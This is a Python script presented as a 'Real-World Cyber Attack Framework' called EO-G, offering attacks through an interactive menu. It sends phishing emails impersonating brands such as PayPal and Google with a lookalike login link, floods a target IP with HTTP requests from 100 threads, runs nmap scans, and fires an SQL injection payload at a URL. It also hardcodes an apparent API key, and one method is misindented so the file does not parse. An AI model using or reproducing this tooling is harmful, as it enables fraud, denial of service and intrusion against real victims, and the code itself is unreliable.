import requests
import threading
import smtplib
import random
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

class EO_G:
    def __init__(self):
        self.modes = {
            1: "Phishing Attack",
            2: "DDoS Attack",
            3: "Network Scan (Nmap)",
            4: "Website Attack (SQL Injection / XSS)",
            5: "Text Generation (DeepAI)",
            6: "Exit"
        }
        self.deepai_api_key = "your-deepai-api-key"  # Replace with your DeepAI API key

    def display_banner(self):
        """Displays a banner."""
        print("""
 ███████╗ ██████╗       ██████╗  ██████╗ 
 ██╔════╝██╔═══██╗     ██╔═══██╗██╔═══██╗
 █████╗  ██║   ██║     ██║   ██║██║   ██║
 ██╔══╝  ██║   ██║     ██║   ██║██║   ██║
 ██║     ╚██████╔╝     ╚██████╔╝╚██████╔╝
 ╚═╝      ╚═════╝       ╚═════╝  ╚═════╝
      Real-World Cyber Attack Framework
        """)

    def phishing_attack(self):
        """Sends real phishing emails."""
        print("[EO-G] Initiating Phishing Attack...")

        domain = random.choice(["paypal", "google", "amazon", "facebook", "instagram"])
        phishing_url = f"https://{domain}-secure-login.com"

        subject = "Urgent: Account Verification Needed"
        body = f"""
        Dear User,

        We've detected unusual activity on your {domain} account. Please click the link below to secure your account:

        {phishing_url}

        Regards,
        {domain} Security Team
        """

        target_email = "victim@example.com"  # Replace with real target email
        self.send_phishing_email(target_email, subject, body)

    def send_phishing_email(self, target_email, subject, body):
        """Sends a real phishing email."""
        sender_email = "your_email@example.com"  # Replace with real email
        password = "your_email_password"  # Replace with real password
        smtp_server = "smtp.example.com"  # Replace with real SMTP server
        smtp_port = 587  # Usually 587 for TLS

        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = target_email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(sender_email, password)
                server.sendmail(sender_email, target_email, msg.as_string())
            print(f"[EO-G] Phishing email sent to {target_email}.")
        except Exception as e:
            print(f"Error sending phishing email: {e}")

    def ddos_attack(self, target_ip):
        """Real DDoS attack using HTTP requests."""
        print(f"[EO-G] Initiating DDoS attack on {target_ip}...")

        def ddos_thread():
            """Sends real HTTP GET requests to flood the target."""
            while True:
                try:
                    requests.get(f"http://{target_ip}")
                except requests.exceptions.RequestException as e:
                    print(f"Error in DDoS thread: {e}")

        threads = []
        for _ in range(100):  # Start 100 threads
            thread = threading.Thread(target=ddos_thread)
            threads.append(thread)
            thread.start()

        print(f"[EO-G] DDoS attack launched on {target_ip}.")

    def network_scan(self, target_ip_range):
        """Real Nmap network scan to discover devices."""
        print(f"[EO-G] Scanning network in range: {target_ip_range}")
        try:
            devices = subprocess.check_output(f"nmap -sP {target_ip_range}", shell=True).decode()
            print(devices)
            return devices
        except Exception as e:
            print(f"Error during network scan: {e}")
            return f"Error during network scan: {e}"

    def website_attack(self, target_url):
        """Real SQL Injection / XSS attack on a website."""
        print(f"[EO-G] Initiating website attack on {target_url}...")

        payload = "' OR 1=1 --"  # SQL Injection payload
        sql_injection_url = f"{target_url}?id={payload}"

        try:
            response = requests.get(sql_injection_url)
            if "SQL syntax" in response.text or "error" in response.text:
                print("[EO-G] SQL Injection successful: Vulnerable to SQL Injection.")
            else:
                print("[EO-G] SQL Injection failed: No vulnerability detected.")
        except Exception as e:
            print(f"Error during website attack: {e}")

    def deepai_text_generation(self, prompt):
    """Generates real text via DeepAI API."""
    response = requests.post(
        "https://api.deepai.org/api/text-generator",
        data={'text': prompt},
        headers={'api-key': "d0bc3e9a-24f7-48ba-829f-e392fc3cf17a"}  # Updated API key
    )
    return response.json()  # Return the response as JSON

    def execute(self):
        """Main execution loop."""
        self.display_banner()
        print("[EO-G] Welcome to EO-G: Real-World Cyber Attack Framework")

        while True:
            print("\n[EO-G] Select an option:")
            for num, mode in self.modes.items():
                print(f" {num}: {mode}")
            try:
                choice = int(input("[EO-G] Enter the number of your choice: "))
                if choice == 1:
                    self.phishing_attack()  # Real phishing attack
                elif choice == 2:
                    target_ip = input("[EO-G] Enter target IP for DDoS attack: ")
                    self.ddos_attack(target_ip)  # Real DDoS attack
                elif choice == 3:
                    target_ip_range = input("[EO-G] Enter IP range for network attack (e.g., 192.168.1.0/24): ")
                    self.network_scan(target_ip_range)  # Real network attack
                elif choice == 4:
                    target_url = input("[EO-G] Enter target URL for website attack: ")
                    self.website_attack(target_url)  # Real SQL/XSS attack
                elif choice == 5:
                    prompt = input("[EO-G] Enter text prompt for AI generation: ")
                    generated_text = self.deepai_text_generation(prompt)  # Real text generation
                    print(f"[EO-G] Generated Text: {generated_text}")
                elif choice == 6:
                    print("[EO-G] Exiting EO-G.")
                    break
                else:
                    print("[EO-G] Invalid option.")
            except ValueError:
                print("[EO-G] Please enter a valid option.")

# Main execution
if __name__ == "__main__":
    eo_g = EO_G()
    eo_g.execute()
